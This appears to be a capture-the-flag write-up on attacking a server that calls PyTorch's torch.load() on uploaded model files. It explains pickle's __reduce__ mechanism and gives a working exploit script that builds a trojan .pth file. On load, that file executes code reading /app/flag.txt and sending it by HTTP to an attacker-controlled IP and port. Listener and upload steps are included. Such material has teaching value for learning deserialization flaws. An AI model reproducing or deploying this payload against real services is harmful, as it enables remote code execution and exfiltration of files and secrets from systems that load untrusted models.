# PyTorch Insecure Deserialization Attack Explanation

## Overview
This attack exploits insecure deserialization in PyTorch's `torch.load()` function. Because PyTorch models use Python's `pickle` module under the hood, uploading a malicious object forces the server to execute embedded code instructions the moment it loads the file.

## Step-by-Step Breakdown
1. **The Vulnerability**: The server blindly calls `torch.load()` on user-uploaded `.pth` model files. 
2. **The Mechanism (`__reduce__`)**: Python's pickle engine uses the `__reduce__` method to figure out how to reconstruct an object in memory. We abuse this to trigger Python's built-in `exec` function automatically upon deserialization.
3. **Pure Python Payload**: Rather than relying on missing system binaries like netcat, the payload uses Python's native `pathlib` to read `/app/flag.txt` and `urllib` to beam the flag back to our attack machine via an HTTP GET request.

## Example Exploit Script (exploit.py)
import os
import torch

HOST_IP = "10.10.15.209"
PORT = 4444

class ExfilPayload:
    def __reduce__(self):
        exfil_code = (
            "import urllib.request, pathlib;"
            "flag = pathlib.Path('/app/flag.txt').read_text().strip();"
            f"urllib.request.urlopen('http://{HOST_IP}:{PORT}/?flag=' + flag)"
        )
        return (exec, (exfil_code,))

if __name__ == "__main__":
    torch.save(ExfilPayload(), "malicious_trojan_model.pth")

## Execution Steps
- Start listener: python3 -m http.server 4444
- Generate payload: python3 exploit.py
- Upload model: python3 upload.py
- Retrieve the flag from your HTTP server request logs.
